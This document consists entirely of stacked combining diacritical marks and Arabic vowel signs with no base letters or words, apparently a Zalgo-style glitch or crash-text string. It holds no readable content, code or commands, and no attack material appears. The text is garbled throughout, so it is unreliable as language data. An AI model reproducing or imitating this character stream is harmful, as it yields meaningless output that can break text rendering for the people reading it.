̴̴̶̶̸̶̶̶̷̸̷̶̶̵̶ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّ̨̧̨̨̧̢̡̨̧̛̛̰̲̜̫͕̻̞͎̫̠͈̳̼͓͖̩͉̯̲̺͇̺͓͉͕̻͍̫̯̥̪͕̯͙̻̠̩͇͔̗̲̯̘̭̙͚̲͉̫͇̣̳̬̱̞͍͓̦̤̲̠͎̞̱͔̳̲̯̺̓ͥ̽́̈ͧ̾ͪͯͮ͗̍̔̀ͦͭ̐̏̀̇̂̃́͑̑̈͋̉ͫͥ̀̑ͣ̇́͂̀ͯͤ̅͌ͧ͋͛ͤ͂͂̒̂͑ͩ͌͂̎͐̄̓́ͮ͛̎̋̀̈́̏ͦ̇̃̓ͪͣ͆̋̍̃ͥ̈̈́̕̚̕͘̕̕͘̕͢͜͢͢͜͜͜͢͟͜͟͠͡͝͡͡͡͞͞͠͝͝͝͡͞͏ًٍَّ͓̣̆͟͏̷̶̵̶̶̵̷̷̵̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̛̭̤͈͇̫͍̦̖̳̲͔̯̞̦̮̯͔̥͕̰̱̹͈̞̤̘̘̼͚͓ͪ̒̇̋ͮ̏͌ͩͩͫ͑͂͋̊ͨͫͬ̄ͪ̐͂̄ͥ̈͘͢͢͢͡͡͝͡͝͝͞͞͝͞͝͏̷ًٌٍٍََُِّّ͚͚̤̝͎͐̀̍͐̆̿͡҉̶ًٌُِ̰͖̾̉҉̶ًٍَّ̪̰̀ͮ̒͏̶̴̴̷ًٌٌٍٍَُُِِّ̛͔̹̾̿̑͞͡͠͏̶ًٌَُِّ͇̠̪͗̀́҉ٍَّ̖ͪ͝͏̵̵̶̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̧̨̨̡̛̛͈̬̦̳̻̯͍̲̦̜͈̯̫͓̬̳͎̟̓́̇͐ͫ̍̌̏ͫ̓̎̿̈́ͬ̈́ͮͬ̊̄͊̉́̊̅̌̓͟͜͡͝҉َ҉̸̴̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̧̢̰͙͙͍̻̟̫̯̭̤̼̫ͭ̉͗̃͛͆̀̌ͬ̒͂̑̅͂͂̀͌̃͘̚͢͝͏̶̵̷ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̧̟̖̙͇̘͎̹͕͈̠͓̺̫̘̿͛͂̎̀ͦͮ́͂͒̀ͯ̓̈ͬ́͑̓̽ͨ̃ͦ̕͜͟͟͜͡͠͠͞҉̴̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̡̧̛̯̲̱̘̟͖̳̗̟̗̖͒̊͒͂͂ͪ̄̌̎̋͗̄́̍ͯ̕͜͡͠͝͠҉ًٌٍَُِِّ͍̳̗̥͗̽͑̅͘͠͏̵̶̷ًًٌٌٍٍََُُِّّ̧̢̯̩̰͍͇̞͕͖̫͗̎͐ͨͨ̆̄͘͝҉̴̷̴ًًٌٌٍٍٍََُُِِِّّ̡̹̗͓̱̗ͫ̓ͨ̑ͤ̿̆̐͢͢͠͞͝҉̸̶ًًٌٌٍٍََُُِِّّّ͈̩̩̯̝̭̬̳͚̺͔ͯ̾͋͂̿́̽̃ͬ̈̇͟͟҉ًًٌٌٍٍَََُُِِّّ̧̡̛͙̞̟̳̹̳̖̖̔̊́ͭ͋͒̊̓ͤ̀̚͘͜͢͝͏̴̴ًًٌٍَُُِّ̞̹̰͇͕̱̓ͮ̊͊̆ͦ͢͝͡͏̶̷̶̶̵̶̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̡̧̩̞̮͉̦͖̻͇͉͚̦̹̼̹͓͙̯̽͑̋ͥͯ́ͧͯͣ͒̍̍ͤ̊ͪ̆̕̕͘͟͜͠͡͡͏ًٌٌٍَُِِّ̥̼̪̩̖̩̌̀̂̑ͫ͒͢͜͡͏̸̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̛̛̛̻̗̮͚͚̱̘̳̝͈̙̳͙͇̰̮͙̲͍̝̥̐̂́̈́́ͭ͐͌ͦ̈́̊́ͭ̏́͌͂̑ͣ̏̔̅̔̅ͪͪ̈̕̚͟͟͟͝͠͏ًُ̝͖͛͏ًًٌٌٍٍََُِِّّ̢̧̢̡̫̣̜̠͙̦͆̎͆̕͝҉̷ًٌٍَُِّ̡̢͖̙̳̿͗ͤͭͧ͏̸ًًٌٌٌٍٍََُُُِِّّ̨̧̫̳̟͉̠̭͙̗͕̑͆̈́̊́́͑́́ͮ̚͢͡͠҉̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̛̛̣͓̝͓̩̭̱̝̰̗̗̥̰̱̖̥̝ͧ̽͌ͤ͂̂ͧ̿̆͋ͨͬ̂̅̎͐̀̿̀ͯͣ͘̚͜͢͜͟͜͠͠͝͞͡͏ًُ̜̒̕҉ٌ̮͏̸ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̡̧̬̥̞͖͕͈̖̮͎͖͖ͭ͌̀̾̐̽ͨͣ̓͡͞͝҉ًٌٍٍَُِّ̡͎̯ͨͨ̿͆́̅̍͞͏̴ًٌٍَُِّ̞͙̻̠ͧ͂͐͏̸̸ًًٌٌٍٍََُُِِّّّ̨̥̙̜͚͇̭͖͕͚̀ͣ͌ͤ̿̓̉̔͜͟͢͝ͅ͏̷̴̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̛̱̰̜̯̱̖̩̙̩͖̟̮̤̏͐̂̉͗͂͑̋͘͜͡͞͏̴̷̵ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̧̨̛̲̞͓̮̹̙̖͖͉̣̫̙̲̣̞̖ͭ̏͐̎ͫ́͒̎͂ͨ́́̑́̒̕͘̕͢͠͞͝ͅ҉̸̸̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̛̛͎̬̝̻̰͙̹̪̩̯̦̗̘̳̱͔͖͕̖̬̲̩̹̜̙̝̖͋̏̌͗͆ͦ̓́̍̎ͯ͌́̍̌ͫ̓̈́̒ͥ͋̈́̍̄̎̎̎̀̓̕͢͟͜͜͟͞͞͞͞͠ͅ҉̴̴̷̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̢̧̭͈̤̰͕̳͙͕̺͓̞͙͓̀ͪ̽́̂̃͂͂̇́̈ͬͬ̉́̔̈́͘͜͢͞͡ͅͅ͏ّ̅҉̷̶ًًٌٍََُِّ̟̣̝̫̀́̂͡͠͝͠ͅͅ͏̷̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨̢̨̛̞͈͓͕̗̮͚͎̩̹̘̫͔̣͍̮͇͓̤͙͎̒̑̐̅̎ͤ́̂́̈̈ͯ̀ͣ͑̇̈̽͜͢͠͏ًٌٍََُِّّ̢̢̢̤͇̱͕̍͂̈́̐ͮ͑ͬͦ͝͏̴̷̷̶̴̷̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̢̡̨̨̛̱͚̝̝͖̳͚͚͙̝̪̖͇̭͙͈͍͆̓̍̇̿ͮͦͣ̎̀́̀͑̒̎̀̎͒̽̒̕̕̕͘͘͜͜͠͞ͅ͏̵ًٌٍَُِّ̢͓̖ͩ͒͡͏̶̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̧̢̭̤̫̙̖̲̜̟̫͍͔͍͖͓̜̻̼͈͕̭̳̣̭̤̉̅͗̃ͣ͐́̈͛̐̀͂ͫ̋ͯͬ̂͂̇͊̆͢͜͡͠҉̵ًًٌٌٍٍٍََُُِِِّّ̡̨̙͉̣̮̰̝̀̓́̌͑ͪ̈́̋̕͢͟͟͝҉̸̴̷̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̡̨̨̯̘̱͎͉̘̝͎̻̩̮̝͇̥̙̥̭̽̅̀͌̀̈͗ͩͯ͗͒͒̓́͗͌͑̿́̓͋̕͢͟͢͝͡͏ًٌٌٍَُِِّ̧̢̛͖̱͕́̋͋͐̍̋ͮ́ͤ̚͘͞͏̶̷̴ًًًٌٌٍٍٍَََُُُِِّّّ̡̛̱͕̭͎̲̋̑̃͑̍͛ͭ̓ͧ̇̿̀̃͠͝ͅ͏ٌٍِّ̡͉̀ͩ̿҉̶̴ًًٌٌٍٍََُُِِّ̨̨̡̘̯̠̖̳̠̦͇̠̺͗̈͐͗͢҉̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̨̡̨̢̢̛̠͔͖̩̞̖̖͉̳̠͚̪̙̬̜͎̻̣̼̾̑̎́́ͭ̊̇͒̋̐ͭͬͪ̋̓̕͢͜͜͢͝͡͠͞͠҉̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̢̡̧̢̧̬͚̩̙̘̝̗̬͈̹̠̤̥̰͇̰̭ͥ͑̓́ͩ̄ͧ̔̊́̐̀̃̌̾͂̒̿͘͘͘͟͟͟͟҉ًَ͉́̕҉̷̸ًًٌٌٌٍٍٍََُُُِِِّّ̨̦̩̮̪̗͖̝͓͆̀̀ͬ͋̐̀́̚͘͟͠͡͠͏̸̶̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̨̡̛̦̻͈͇̟̼̫̩͈̳͍̰͙̜̭̓̑̊̏̽͌͑͑̎̅̀̆͋̓̿̍͐̈ͣͬ̋͟͜͡͠͡҉̴̷̶ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̣͖̞̙̹͙̗̯͍̙̖̭̭̟ͩ̓ͮͭ͒̃͋ͦ̔ͣͩ̅͂͘̚͟͟͢͟͡͏ًًٌٌٌٍٍٍََُُُِِِّّ̢̩̪͚͔͓͖̟͉́̐ͧ̀ͭͭͭ̔̀ͭ̿͘͢͏̷̷̶̸̸̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̡̧̡̡̧̨̛̛̛̺̦̯̯̼̰̗̳͇̞͇̼̠͍̫͙̦̤͍̗̰̱͉̱̞̟͎̼͕̰͕̱̩̤͍̖͈̃ͮ̎̉́̉͐̐͗͂̑̏̾̔͗̊́ͦ̃̀̊ͯͥ̉́̆ͦͬ͋̀̀̉ͥ́ͫ̅̓̾̉̌̎̓̀͒͂͗͋̚͘͢͠͠͞͝͝͞͠ͅͅ҉̷ًٌٌٍٍَُِِّ͚̮̩̻̏̎̒ͧ͞͝͏ًَُّ̻͇̩́͗҉̴̴̷̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̧̨̛̰̺̫͇͚̬̳͖̭͖̱͚̫̪̯̫̺̗̘ͣ̔ͦ͌͑̈́̐̈̍ͯ̐̄͆̍̉͘̕͘̕͜͟͢͢͝͝͞͠͡͏̴̶ًًٌٌٍٍٍََُُِِّّّ̩̝̻̱̹̣̣̙̱͈ͪ͑̐͊̍́ͮ͋̇ͫ͘̕̕̕͠҉̴̷̴̴̵̷̶̴̷̴̷̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̡̡̢̧̧̨̧̨̢̢̡̨̛̣̹̗̼̳͕͕̦̯̗̙͚̗͍̼͕͕̻̺͔͓̳̘̪͙̳͖̮̝̝͖̳͕̻̮͚̞͎̅̅̂͑̽ͧͥ̆̉ͧ̀ͪ̀̾͐̏̄͑ͨͦ̌̔͋̾͂ͧͣ͋́̀͐̔́͆͒̀̓̿ͨ́̉ͭ̎̀̓̒͟͜͢͢͟͜͜͟͜͠͠͡͝͠ͅͅ҉̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̡̛̲̣̟̠̹̦̬̯̲̼̖̽̉͂́̓̄̎͊̃̒͌ͦͥ̌͘̕͢͝͡͠͠҉̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̧̦̺̳̘̥̘̥̜̖̲͒͆ͫ̍̅̓̇̋̐̓͋̍̓̄ͦ͘͟͟͝͡͞͝҉̴ًًٌٌٍٍََُُِِِّّ̢̛͚̹͍̙̳͈̩̍͋̽ͭ̀̇͘͢͞͏̵̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̨̨̢̨̛͎͍̝̬̮͍̠̣̫̙̟͉͈͚̫̱͓͉̠͚͙̤̙̂̒̏ͣ̐͊ͫͨ̅̊͌̀̈̀̓̃́̀ͪ̉̅͘̕͘͜͜͝͞͞ͅ͏ًٌٍَُِ̗̫͋̊̉͡҉̶̵ًًٌٌٍٍَََُُِِّّّ̧̛̺̬̘̲͈̖̤̦͒͒́ͩͪ̌̇͊͘͠҉̶ًُ̑̓҉̶̸ًٌٍَُِّ̪̲͖͇͊͋͛̃ͦ̀͡͞͏ٌ̎͏ًٌٍٍَُِِّّ̻̪̫̠̜̭̿͌̀ͩ͐̀̚͟͜͏ًٌَُ̨̨̻̤͆̽͆͏̷ًًٌٌٍٍََُُِِّّ̡̝̺̝͋ͮͮ̍͛̀̿̋͘͠͝҉ٍِ̘҉̷َّ̞̯ͫ҉ًٌُِ̖͔̘̂ͫͫ̕͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̛̛̱͔̟͉̩̦͉̯͉̼̍̈́ͮ̀ͧͦͦ́͌̕̕͜͟͝͝͏̴̸̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̧̘͓͉͎͉̲̝̝͈̙̤̜̱̆ͮͨͬ͋̔͐̅̀̎̈ͮ̿ͧ̌̃̕̕̚̕͢͟͟͟҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̨̛̛͕̺̣̼̮̖̙̥̗̪̦͚̣̊͊́ͧ͊ͥ̒͋́́͛͢͜͢͢͞҉̶̷ًٍَُِّ̨͚̩̽͌̽͏̴̷ًٌٌٍَُِّ̤͖̳͂ͯ͐̀̿̆̕͏̷̴ًًًٌٌٍٍٍَََُُُِِِّّّ̧̬̖̠̬̱̖̲͎̬̮̖̭͙̏̆̅ͩ̈̏̍ͣ̀ͯ̔͟͟͟͞͠ͅ͏̶̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̢̡̧̛̻͈̯͕͙̫̯͚̦̤̘̭͔͓̲̣̪͉̘̣̺̀͂ͮͤ̋̃ͣ̄̃͒̓͗ͦͨ̌̌̊̕̚̚͢͡͡͞҉̷̶ًًٌٌٍََُُِّّ̰͇̖̹̪͈ͧ̑̆̽͌͊ͦ͟͞͝͝͏̵̴̵̴̸̷̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̨̨̧̧̨̢̡̟̰̳̖̝̲̬̹͕͓̮͉̠̞̙̰̙̥̣̯̩̣͚͎̭̫̪͖̘ͭ̔̆ͯ̀̆̐̈̒́̐ͭ͑͐ͫ̈́͊̂ͧ̓̽͒͑̍̽ͤ̎̿̈̒͋̌͘͘̚͘̕̕͜͟͟͢͞͡͞͠͏̸̸̷̸ًًٌٍٍََُُِّّ̨͙̩̮̩̪͙͛ͣ̆̿́̿͝͏̷̸̷̴̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̨̢̫͙̳̫̬̭͉̰͈̱̮̭̖̦̒̈́ͭ̊ͬͬ̍̏̀ͯͦ̃̇̎́͌ͭͤ͘͘̕͜͢͡͝͠͝͞͡͝ͅ҉̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّّ̡̨̛̜͓̥͇͈̦͉̤̜̘̹̯͈̫̄͑̽͊ͯ̅ͣ͆͂́ͮ̔̆̀͊̕͘̕͘̕͢͟͟͠͡ͅͅ͏ًًٌٌٍٍَََُُِِّّ̼̩̼͚̦̤͖̖̘̔̀̑̿͆̀̐̂̀ͥͨͨ͑̀̊̕͢͜͜͡͏ًٌٍَُِّ̨̨͈͚͔̀ͩ͑ͪ̈́́̉̚҉ًًٌٌٍَُُِّ̨̨̨͙̜̣̯̦̩̬̽́ͫ̊ͬ͘͞͠҉̵ًًٌٌٍٍٍََُُِِِّّ̞͎̬̞̻͎͓͔̟́̈͋ͬͬͨͩ̒̚͢͟͟͝ͅ҉̶ًَّ̯͂̈͏ٌٍَُِّ̛͔͠҉̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̛̝̥͔͚̙̜͚̹̫̺̯̪̹̝̦͋ͤͪ̀̍͆̉͑̀̋͒̎ͦ͛͘͝͠ͅ҉ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̨̢̛̲͙͙̤̳̻͈̯̱̼͈̳̟̙͈̺͓͓͙̬͕̻ͧ͊̍̓ͯ͒̓ͮͤͦ͋̏̂́͐̂̎̀ͥ͛̇̌̚͢͜͞͡͡͝͡͝҉ًًٌٌٍََُُِّّ͉͈̙͍͇͖̹͇́ͨͨͨͤͩ̍̌͞҉̶ٍَِّ͉̤̲͓̋̇͏̴̴ًٌُِ̧͖҉̴̷̶̶̴ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̡̢̡̢̛̛͇͙͎͈̻̜̹̺͙͔͍̣̟̻̖͓̖͔̲̳̞̠̱̔̈́ͩ͂̌̐̃̓ͬ̀̉ͩ͒̾ͣ͂́ͯ͋ͭ͟͞͝͠͞ͅ҉̷̷ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̡̨̛̱͕͍̹̣̙̲͉̭͉̲͖̜̻́̊̀ͭ̆̐̏̿̅͒́͘̚͜͟͞͞͞͏̸̸̶̵̴̷̴̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̢̛̛̛̛̛̛̛̞̩̖͈̘̪̗̥͉͇̘͓̲͇̩̟͎͕̪͉̙͓̦̠͇͎ͣ̈ͪ̎ͭͧͨ̓́̇ͨ̍͛ͨ̉ͧͨ̐̀̽͆́ͪ̉͘̚͘͟͜͡ͅͅ͏ِ҉ًٍَُّ͓̻̟̞̈ͧ͏̵ًٌٍَِّ̡̢̗͉̠̀͂ͩ̔̍̄҉̷̶̸ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̛͔͎͍͉͔͈̙̫͚̗͓̙̓̽͋́̆̂̊́͂͆̓̍̚͘̕͟͞͞҉̸ًٌٍٍَُِّّ̢̼̯̼̜̪̉͒ͥͤ̚͘͠͠҉̷̵̷̸̴̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̥̹̹̫̫͔͍͉̖͈͕ͥ͑̿̑̓͋͗̿̆̑ͩ͆̈́̀̑ͨ̕̚͟͜͞͞҉̸̴ًٌٍََُِّ͚̜̹͌̃ͯ̕͜͝͏̷̷̸̷̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̡̨̼̞̩͚͖̼̞̠̥̪̜͉͉̓ͬͯͬ͐ͪ̒ͩ͌͂͊̊̍ͧ͜͟͡͝͞҉̴̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̞͉̣̯̫̺̏̆͌͛̀ͫ͌̚͘͝͞͞҉̶̶̵̸ًًٌٌٍٍَََُُِِّّ̗̬̺̟̮͈̭̰̏̄̽ͫͫͨ̅̿̕͘͝ͅͅ͏ًٌٍَُِّ̧̠ͨ̿҉ًٌُ͕̤͂ͤ͝͏̷̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̛̛̤̟̤̖̣̞̖͕̩̝̗̦̣̉̀̉́̈ͣͤ̇͐ͤ̽ͧ̋̿̌̈ͮ͘̕̕͢͝͞͏̴̸̶ًٌٌٍَُُِّ̢̗̣̞̪͓̽́͗͌̏̿̆̇͢͡͏ٍِ̣̆͘͏ًًًٌٌٌٍٍَََُُُِِِّّّ̧̢͙̗̠͓̺ͦ͐̏̎̇̎́̓ͦͨ̀̉ͦͥ́ͪ̋ͧ͘̕̚͞҉̶ًٌٍَُّ͌̔̀ͯ͏ٍَِّ̠͛́͟҉ًٌٍُِّ̧̥̻̥̺̐ͣ͗͜͟҉̴̶̶ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̛̻͚̼͓͙̲͇̮̥̜̺̱̼̮̼͂͑ͣ̒̌̍ͣ̌̏ͫ͗ͨ̀̍̒̉̀́͘͟͡͞͡ͅͅͅ͏̶ًًٌٍٍََُُِِّّ̡̧͇̣̫̬̪̱̥̈̾͛̿ͣ̂ͭ͘͟͢͞҉ٌِ͉ͭ͏̷̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̧̫̖̭̰̺͚̼̳̱̳̬͍̦͍̲̝̉ͤ̀ͤ͑̀́̓͌͐͌ͥ̋͗ͮ̋̌ͨ̚̕͘͢͠͠ͅ͏̴ًُ̱̙̆͏̶̴ًًٌٌٌٍٍٍَََُُِِِّّّ̢̡̺̮͇̹̮̩̩̹̩͖̻͈̍̈̒ͩ͌̎̏ͣ͡͡҉̵̴̵ًًًٌٌٍٍََُُُِِّّ̡̱͚̩̩̙̩̰̘̺̱̲ͧ̀̀ͪ͐ͭͦ͘͟͡͡ͅ҉ًٌٌٍٍَُِِّ̡͖̯͓͔̼̻̉̄́̓ͬ̉͛ͤͥ̈́͝͡ͅ͏ًًٌٌٍََُُِِّّ̨̨̡͈̥͇̖̮̱̝̞̈̐̎̄́̊͡͝͏̷̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̡̛̛̛̮͓͚̟̠͓̟̝̭̻̱̙͚̣̰͕̻̙̬̥̞͉̈͊̾ͫ͒̃ͬ̓ͩ̀̿̌̂́̐̑͗̑́̇̄̓ͨ̀͑͆͟͟͟͢͞͝͡͠͝҉̵ًٌٍٍََُِّّ̢̢̰̻̱̯̹ͭ̅ͩͨ̃̕҉̷̷̸ًًٌٌٍٍَُُِِّّ̢̡̨̣̗̖̞̞̥͂̌̽̏̾̕҉̵̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨͙̰̪̱̱̟̩̤̟͓͎̗̪̙̿ͣ̓́́͆́͒̇ͨ̏͐͆͘͜͢͢͢͞͏ًَُ̤͐̐ͩ͏̷ًٌٌٍَُِِّ̦̲͍ͨ͋ͪ̌ͧ̀͜͜͢҉̸ًًٌٌٍٍٍَََُُِِّّّ̧̢͔͔̞̠͍̙̹̖̬͈̠͍́̀̒̄ͧ͆̃͋ͤ̊͑̍͢͝͡͏ًٌٍُِ̭͙̙̳̗̋́҉ّ͏ًًًٌٌٌٍٍٍَََُُُِِِّّ̢̧̢̻͔̪̠̪̆́̉̑̈̀̔ͪ̓͋̄ͭ̂́ͮ̕͟͢҉ًٌَُِّ̫̘ͫ͋̇ͬ͘҉̵ًٍَّ̛̠͍ͯ́ͫ͏̶̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̡̳̬͖̬̺͔̲̺̝̼̥͎̳̙̘̲͕̰̞̬̯̱̮̋̾̉̍͛ͭ͑̎ͬ͑͊͒͑ͥ͗́ͬͧ̀ͣ̀̍ͧ̕͘͢͜͜͞͝͡ͅͅ͏ًٍَّ̺̤̭͒͂҉ُ̝҉ٌٍِ͇͛̑҉̶ًًٌٍََُُِّّ̪̫̦̠̗͙͇̿̉͊ͥ́ͨ̏͛͟͢͟͝͡͏̵̷̶̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̡̧̧̡̫̺̼̥̪̮͈̼̖̳̭̝̻̗̫̣̖͕͖͖̤̣̦̹ͨͦͫ͂͆̎̎͊̓̿͗ͯ͆ͬ̆́̕͜͢͠͞͝͡͞ͅ͏̶̸ًًٌٍََُِّّ̛̛̪͔̙͖̄ͯ̑ͪ́̎͞͏ٌٍُِ͖̾́͂҉̵̵ًًٌٌٍٍََُُِِّّّ̛̲̼̱̙̩̤͗̒̽ͯ͜ͅ͏ًًٌٌٍٍَََُُِِّّ̧̨̱̭̺̮̙̒̄̑̑ͧ͐̊̋́ͧ̕͟͝͝҉̷ًًًٌٌٍٍََُُُِِّّ̡̘̯̩̖̜̞̘̭̬ͨͨ͂̊̋ͧ̉͒̍ͧ̕̚͞͡͞҉ٌٍِّ̱̈̀̐͜͏̴̷̴̶̸̷̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̡̨̢̛̛̛͔̺̼̥̯̳̳̰̘̺̯̱̬̜͉̫͈̹̐͑͊ͤ́ͯ̒ͨͬͥ̐̀̽͊ͭ̐ͦ̄̓ͨ͘͟͟͠͠͝͝͞͞͝ͅ҉̷ٌُِ͍͊̿҉̶ًٌٍٍَُِّ̢̝͔̲͎̥̌́̓̔͝ͅ͏̷̸̸̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̨̡̮͈͉̺̠̼͖̗̦̩̜̙̠̞̯͂̄͌̊͂̃́ͬ̾̒ͯ͟͟͢͡͝͝͠͏̴̴ًًٌٌٌٍٍََُُُِِِّّ̪̺̹̣̤͙͆̀͌̑ͮ̍́̐͘͢͜͡͝͏̷̸̶̴̶̵̵̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̧̡͉̖̥͇̥̭̼̙̣̬̱̤̘͕͇̘̟̪̺̖̲̼̪͇̈ͧ́ͤ̏̔̏͌͒̾̎̈͌̑̀̊͋ͫ̀̀̄̍̎̀̍̎̉͘͢͢͜͝͡͝͠͞ͅ͏̷̷̴̶̸̴̸̷̴̶̸̶̶̵ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̢̧̨̧̨̡̨̡̢̨̧̡̧̨̛̛̛̛̛̛͍̥̼̫͈̣͔͍̯̱̮͖̟̪͚̦͕͓̹͔̹͕̱̝͉͕͙̭͇̟̲̭͚̩̩̣̪̞͔͖̼͚͖̭̯͓̻͕̘͔͙̪̺͍̣̝̯͕̬̪͓͉̗̈̂̌͆ͬ̿ͭ͐͒ͫͤ̀̾ͨ̈ͬ͋̇ͨ͊͐̓̾͌̆ͫ̎̉ͮͫ̑̈́́ͯͧͥ̀̀ͯ́ͨ̅́̉̽ͦ̎̊͋̿ͭͫ̐̀͋ͯ̒̈́̋̂̂͒̓̀ͨ͊͐̀̈̅̾͐͛͋́ͮ́͘͘͘̕̕͟͜͜͜͟͟͟͟͟͢͝͞͠͝͡͡͡͠͞͠͠͠͝ͅͅͅ҉ًًٌٌٌٍٍٍََُُُِِِّّّ̢̨̰̱̱͔̪̞͓͚̟̖͒̊̄ͯ̀̓͛̊̚̚͢͢͟͢͝͡҉̶̵̵̷̴̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̧̼͖̹͉͕̫̤̙̝̤̼̩͈͎̤̋͊̀͋͒̎ͭ̄ͧͫ͑͒̂ͯͭ͂̑̅͘͟͜͝͝҉̶̸̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡͔̣͍͓͎̹̯̳̍ͯͤ̂͆̅͐͡͠͡͏ُ̾҉̴̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̨̛̩̤̺̬͓͉̻̘̖͓̞̩̦͓̐̎ͣͫ̓͑͠͡ͅ͏َّ͖̘ͪ͏̴̵̵̴̵̸̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̡̧̡̧̞̼̮̯̤̰͙̗̣͚̝͈̹̗̖̪̠͚̮͎̟̹͇͇̺̯̖͓̖̫̝͔̺̥͋̾̐̊ͩ̂̂̌̋ͦ̑ͬ̏̈̀͐ͤ̀̅ͤ̓̔̋ͦͣ͆̌̈́̀ͪ͋͊͆̽̈́̎ͪ͘͢͟͝͞͞͠͞͡͠͝͝͞͠͠͝͞͝ͅ҉̸ًًٌٌٌٍٍََُُُِِِّّ̧͇̰͇͈̤̱̱̎̊̊̎͗ͦ̽ͭ̿͘͢